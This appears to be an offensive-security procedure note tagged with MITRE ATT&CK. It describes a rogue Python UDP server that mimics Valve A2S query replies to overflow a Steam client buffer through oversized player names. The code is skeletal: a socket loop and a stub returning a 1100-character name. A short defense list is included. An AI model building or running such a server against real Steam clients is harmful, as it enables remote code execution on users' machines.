---
tags:
  - udp
  - server
  - steam
type: procedure
tools:
  - '[[tools/Python]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Windows
  - Linux
  - macOS
techniques:
  - '[[Exploitation for Client Execution]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 0c632f25-2b77-477a-9322-79321c939bb0
created_at: '2025-12-14T17:24:18.437Z'
updated_at: '2025-12-14T17:24:18.437Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Implement-Malicious-UDP-Server-for-Steam-Queries

## Summary

This procedure sets up a custom Python-based UDP server to emulate a Valve game server, responding to A2S_INFO and A2S_PLAYER queries on port 27015, enabling the delivery of malicious payloads for exploiting the Steam client.

## Description

In the attack scenario, the attacker creates a rogue server that mimics legitimate Valve Source engine server responses. When the Steam client queries for server info or player details, the server replies with crafted packets, including oversized player names to trigger the buffer overflow. This targets the serverbrowser library's unicode conversion routine without bounds checking. Prerequisites include Python with socket library and network access to port 27015. Expected outcomes: Server ready for fuzzing and exploitation, leading to client crashes or RCE.

## Requirements

1. Python 3.x installed with socket and struct modules
2. UDP port 27015 available and not firewalled
3. Knowledge of Valve query protocol (A2S_INFO, A2S_PLAYER)

## Defense

Defensive measures and detection strategies:

- Monitor unusual UDP traffic on port 27015
- Implement client-side input validation in Steam updates
- Use network firewalls to block unsolicited UDP queries

## Objectives

1. Establish a controllable response point for Steam queries
2. Prepare for payload injection in player name fields
3. Enable remote triggering without direct victim interaction

## Instructions

### Step 1: Create Server Script

**Context**: Write a Python script using sockets to bind to UDP 27015 and handle incoming queries.

**Command** (Python script execution):
```python
import socket
import struct

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', 27015))
while True:
    data, addr = sock.recvfrom(1024)
    # Parse A2S query and respond accordingly
```

> This binds the server and loops to receive packets. Expected output: Server running, logging incoming data.

### Step 2: Implement Response Functions

**Context**: Define functions like createA2S_INFO() and createA2S_PLAYER() to craft responses, including oversized unicode player names.

**Command** (Add to script):
```python
def createPLAYERReply():
    # Oversized payload: unicode string > buffer size
    player_name = 'A' * 1100  # Or unicode variant
    # Pack into protocol format
    return packed_response
```

> Builds the malicious reply. Expected output: Valid packet ready for sending back to client.

### Step 3: Test Server Binding

**Context**: Run the script and verify it responds to a test query from Steam or a tool like netcat.

**Command** (Run server):
```bash
python server.py
```

> Starts the server. Expected output: 'Listening on 27015' message, no bind errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Python]]

## Tags

- udp
- server
- steam
